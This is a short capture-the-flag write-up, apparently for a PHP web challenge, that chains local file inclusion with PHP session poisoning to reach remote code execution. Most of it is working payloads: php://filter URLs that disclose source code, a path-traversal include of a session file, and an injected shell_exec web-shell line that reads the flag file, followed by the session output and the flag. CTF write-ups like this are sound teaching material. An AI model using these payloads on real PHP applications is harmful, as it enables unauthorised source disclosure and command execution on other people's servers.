* Category
  * Local File Inclusion
  * PHP Session Poisoning
* Solution
  1. How to get source code?
     * Use the same technique as [喵 site](../喵%20site/README.MD) to retrieve ```home.php``` , ```list.php``` , ```post.php``` , ```index.php```
  2. LFI can further be leveraged to find session file
     * session id can be retrieved from ```phpinfo``` or cookie
  3. The php command in session file will be executed
     * Include the command by server's api ```post.php```
     * And then use LFI to view the session file again to see the result
* Payload
  1. ```http://splitline.tw:8401/?module=php://filter/convert.base64-encode/resource=module/home.php```
  2. ```http://splitline.tw:8401/?module=php://filter/convert.base64-encode/resource=module/list.php```
  3. ```http://splitline.tw:8401/?module=php://filter/convert.base64-encode/resource=module/post.php```
  4. ```http://splitline.tw:8401/?module=php://filter/convert.base64-encode/resource=index.php```
  5. ```http://splitline.tw:8401/?module=../../../tmp/sess_06010ee6594de0614e832c41430f6bad```
     * ```notes|a:2:{i:0;s:3:"123";i:1;s:3:"123";}```
  6. ```<?php echo shell_exec("cat ../../../flag_aff6136bbef82137"); ?>```
     * ```notes|a:8:{i:0;s:3:"123";i:1;s:3:"123";i:2;s:43:" Warning: shell_exec(): Cannot execute a blank command in /tmp/sess_06010ee6594de0614e832c41430f6bad on line 1 ";i:3;s:32:"/var/www/html ";i:4;s:41:"bin boot dev etc flag_aff6136bbef82137 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ";i:5;s:62:"../../../flag_aff6136bbef82137 ";i:6;s:63:"";i:7;s:63:"FLAG{include(LFI_to_RCE)}";}```
* ```FLAG{include(LFI_to_RCE)}```